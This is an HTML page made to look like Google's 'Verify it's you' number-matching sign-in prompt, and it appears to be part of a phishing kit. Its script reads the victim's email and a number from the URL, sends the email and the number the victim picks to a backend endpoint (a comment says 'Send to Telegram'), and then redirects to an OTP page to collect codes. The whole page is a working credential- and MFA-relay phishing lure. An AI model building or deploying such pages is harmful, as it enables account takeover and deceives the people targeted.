<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify it's you - Google Accounts</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="icon" type="image/x-icon" href="images/google-logo-vector-format-white-background-illustration-407571050.webp">
    <style>
        :root {
            --gmail-blue: #1a73e8;
            --gmail-red: #ea4335;
            --gmail-green: #34a853;
            --gmail-white: #ffffff;
            --gmail-gray: #5f6368;
            --gmail-border: #dadce0;
        }

        * { box-sizing: border-box; }

        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            min-height: 100%;
            font-family: 'Roboto', sans-serif;
            background: var(--gmail-white);
            color: #202124;
        }

        .container {
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
            padding: 48px 36px;
        }

        .logo {
            width: 75px;
            height: 25px;
            margin-bottom: 24px;
            background: url('images/google-logo-vector-format-white-background-illustration-407571050.webp') no-repeat center;
            background-size: contain;
        }

        .title {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 16px;
        }

        .subtitle {
            font-size: 16px;
            color: var(--gmail-gray);
            margin-bottom: 32px;
        }

        .number-highlight {
            background: #e8f0fe;
            border: 2px solid var(--gmail-blue);
            border-radius: 8px;
            padding: 24px;
            text-align: center;
            margin-bottom: 24px;
        }

        .number-highlight-label {
            font-size: 14px;
            color: var(--gmail-gray);
            margin-bottom: 8px;
        }

        .number-highlight-value {
            font-size: 48px;
            font-weight: 500;
            color: var(--gmail-blue);
        }

        .number-grid {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 8px;
            margin-bottom: 24px;
        }

        .number-btn {
            padding: 16px;
            border: 1px solid var(--gmail-border);
            background: white;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .number-btn:hover {
            background: #f8f9fa;
            border-color: var(--gmail-gray);
        }

        .number-btn.selected {
            background: var(--gmail-blue);
            color: white;
            border-color: var(--gmail-blue);
        }

        .number-btn.target {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 0 0 rgba(26, 115, 232, 0.4); }
            50% { box-shadow: 0 0 0 10px rgba(26, 115, 232, 0); }
        }

        .btn {
            width: 100%;
            padding: 12px 24px;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-bottom: 12px;
        }

        .btn-primary {
            background: var(--gmail-blue);
            color: white;
        }

        .btn-primary:hover {
            background: #1557b0;
        }

        .btn-primary:disabled {
            background: var(--gmail-gray);
            cursor: not-allowed;
        }

        .btn-secondary {
            background: white;
            color: var(--gmail-blue);
            border: 1px solid var(--gmail-border);
        }

        .instruction {
            font-size: 14px;
            color: var(--gmail-gray);
            margin-bottom: 24px;
        }

        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #f8f9fa;
            border-top: 1px solid var(--gmail-border);
            padding: 16px 24px;
        }

        .footer-links a {
            color: var(--gmail-gray);
            text-decoration: none;
            font-size: 12px;
            margin-right: 16px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"></div>
        <h1 class="title">Verify it's you</h1>
        <p class="subtitle">For your security, Google needs to verify it's you. Please select the number shown on your other device.</p>

        <div class="number-highlight">
            <div class="number-highlight-label">Select this number:</div>
            <div class="number-highlight-value" id="targetNumber">--</div>
        </div>

        <p class="instruction">Tap the matching number below to verify your identity:</p>

        <div class="number-grid" id="numberGrid">
            <!-- Numbers will be generated by JavaScript -->
        </div>

        <button id="verifyBtn" class="btn btn-primary" onclick="verifyNumber()" disabled>Verify</button>
        <button class="btn btn-secondary" onclick="tryAnother()">Try another way</button>
    </div>

    <footer class="footer">
        <div class="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </footer>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email') || '';
        const targetNumber = urlParams.get('number') || '';
        let selectedNumber = null;

        // Display target number
        document.getElementById('targetNumber').textContent = targetNumber || '--';

        // Generate number grid
        function generateNumberGrid() {
            const grid = document.getElementById('numberGrid');
            grid.innerHTML = '';

            // Generate random numbers 0-99
            const numbers = new Set();
            numbers.add(parseInt(targetNumber) || Math.floor(Math.random() * 100));
            while (numbers.size < 20) {
                numbers.add(Math.floor(Math.random() * 100));
            }

            // Shuffle and display
            const shuffled = Array.from(numbers).sort(() => Math.random() - 0.5);
            shuffled.forEach(num => {
                const btn = document.createElement('button');
                btn.className = 'number-btn';
                if (num.toString() === targetNumber) {
                    btn.classList.add('target');
                }
                btn.textContent = num.toString().padStart(2, '0');
                btn.onclick = () => selectNumber(num, btn);
                grid.appendChild(btn);
            });
        }

        function selectNumber(num, btn) {
            // Remove previous selection
            document.querySelectorAll('.number-btn').forEach(b => b.classList.remove('selected'));
            
            // Add selection
            btn.classList.add('selected');
            selectedNumber = num;
            
            // Enable verify button
            document.getElementById('verifyBtn').disabled = false;
        }

        function verifyNumber() {
            const btn = document.getElementById('verifyBtn');
            btn.textContent = 'Verifying...';
            btn.disabled = true;

            // Send to Telegram
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '/api/next.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    btn.textContent = 'Verified!';
                    setTimeout(() => {
                        window.location.href = 'otp.html?email=' + encodeURIComponent(email);
                    }, 1500);
                }
            };
            xhr.send('di=' + encodeURIComponent(email) + '&chosen_number=' + selectedNumber);
        }

        function tryAnother() {
            window.location.href = 'otp.html?email=' + encodeURIComponent(email);
        }

        // Initialize
        generateNumberGrid();
    </script>
</body>
</html>
